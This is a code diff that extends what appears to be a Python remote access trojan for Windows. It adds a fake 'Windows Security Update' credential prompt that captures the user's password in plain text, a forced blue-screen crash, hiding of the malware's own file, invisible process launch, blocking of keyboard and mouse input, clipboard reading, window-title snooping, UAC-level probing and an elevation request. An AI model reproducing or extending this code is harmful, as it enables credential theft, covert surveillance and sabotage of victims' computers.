@@ -6,6 +6,7 @@ import inspect
 import json
 import locale
 import os
+import pathlib
 import platform
 import re
 import shutil
@@ -17,6 +18,7 @@ import sys
 import threading
 import time
 import wave
+import webbrowser
 import winreg
 
 import cv2
@@ -24,6 +26,7 @@ import ntsecuritycon
 import psutil
 import pyaudio
 import pyautogui
+import pyperclip
 import requests
 import tabulate
 import win32api
@@ -140,7 +143,7 @@ class Command:
     def execute(command):
         try:
             cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
+                                   stdin=subprocess.DEVNULL)
             result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
             if not result:
                 result = 'null'
@@ -415,6 +418,11 @@ class Command:
         ctypes.windll.ntdll.ZwShutdownSystem(2)
 
     @staticmethod
+    def bsod():
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.RtRaiseHardError(0xc0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+
+    @staticmethod
     def setcritical():
         try:
             is_critical = ctypes.c_int(1)
@@ -560,14 +568,14 @@ class Command:
             return 0, '[-] Error: ' + str(exception)
 
     @staticmethod
-    def get_info():
+    def getinfo():
         try:
             computer = wmi.WMI()
             computer_info = computer.Win32_ComputerSystem()[0]
             gpu_info = computer.Win32_VideoController()[0]
             proc_info = computer.Win32_Processor()[0]
             info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
-                    'intgty_lvl': Helper.get_integrity_level(),
+                    'intgty_lvl': Helper.get_integrity_level(), 'uac_lvl': Helper.get_uac_level(),
                     'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
                     'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
                     'model': computer_info.Model,
@@ -605,6 +613,143 @@ class Command:
             return 1, result
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def askpass():
+        try:
+            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::Username,' \
+                   '[Environment]::UserDomainName); '
+            cmd2 = 'echo $cred.getnetworkcredential().password;'
+            p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
+                                 stderr=subprocess.PIPE)
+            return 1, str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def askuac():
+        try:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                if not getattr(sys, 'frozen', False):
+                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv),
+                                                                 None, 1)
+                else:
+                    exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
+                    shutil.copy2(EXECUTABLE_PATH, exec_copy)
+                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
+                                                                 ' /c {}'.format(exec_copy),
+                                                                 None, 1)
+                if result > 32:
+                    return 1, '[+] Success'
+                else:
+                    return 0, '[-] Error: {}'.format(result)
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def hideme():
+        try:
+            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
+            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def active_window():
+        try:
+            return 1, pyautogui.getActiveWindowTitle()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def open_windows():
+        try:
+            titles = []
+            for window in pyautogui.getAllWindows():
+                if window.title.strip():
+                    titles.append(window.title)
+            return 1, '\n'.join(titles)
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def set_wallpaper(filename):
+        try:
+            if os.path.isfile(filename):
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(os.path.realpath(filename)), 0)
+                return 1, '[+] Success'
+            else:
+                return 0, '[-] File not found'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def get_clipboard():
+        try:
+            return 1, pyperclip.paste()
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def set_clipboard(text):
+        try:
+            pyperclip.copy(text)
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def zip(path=None):
+        try:
+            if path is None or not os.path.exists(path):
+                path = os.getcwd()
+            shutil.make_archive(os.path.basename(path), 'zip', path)
+            return 1, '[-] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def unzip(filename):
+        try:
+            if os.path.isfile(filename):
+                path = os.path.join(os.getcwd(), pathlib.Path(filename).stem)
+                shutil.unpack_archive(filename, path)
+                return 1, '[-] Success'
+            else:
+                return 0, '[-] File not found'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def open_url(url):
+        try:
+            webbrowser.open(url)
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def run_hide(process):
+        try:
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+            info.wShowWindow = 0
+            p = subprocess.Popen(process, startupinfo=info)
+            return 1, '[+] Process created: {}'.format(p.pid)
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def block_input(flag):
+        try:
+            flag = flag.lower() in ('true', '1')
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                ctypes.windll.user32.BlockInput(flag)
+                return 1, '[+] {}'.format(flag)
+            else:
+                return 0, '[-] Operation requires elevation'
+        except Exception as exception:
+            return 0, '[-] Error: {}'.format(exception)
 
 
 class Helper:
@@ -790,6 +935,34 @@ class Helper:
         handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_READ)
         sid = win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel)[0]
         return intgty_lvl.get(sid.GetSubAuthority(sid.GetSubAuthorityCount() - 1))
+
+    @staticmethod
+    def get_uac_level():
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0,
+                             winreg.KEY_READ)
+        i, ConsentPromptBehaviorAdmin, EnableLUA, PromptOnSecureDesktop = 0, None, None, None
+        while True:
+            try:
+                name, data, type = winreg.EnumValue(key, i)
+                if name == 'ConsentPromptBehaviorAdmin':
+                    ConsentPromptBehaviorAdmin = data
+                elif name == 'EnableLUA':
+                    EnableLUA = data
+                elif name == 'PromptOnSecureDesktop':
+                    PromptOnSecureDesktop = data
+                i += 1
+            except WindowsError:
+                break
+        if ConsentPromptBehaviorAdmin == 2 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
+            return '3/3 (Maximum)'
+        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 1:
+            return '2/3 (Default)'
+        elif ConsentPromptBehaviorAdmin == 5 and EnableLUA == 1 and PromptOnSecureDesktop == 0:
+            return '1/3'
+        elif (ConsentPromptBehaviorAdmin == 0 and EnableLUA == 1 and PromptOnSecureDesktop == 0) or EnableLUA == 0:
+            return '0/3 (Disabled)'
+        else:
+            return None
 
 
 while True:
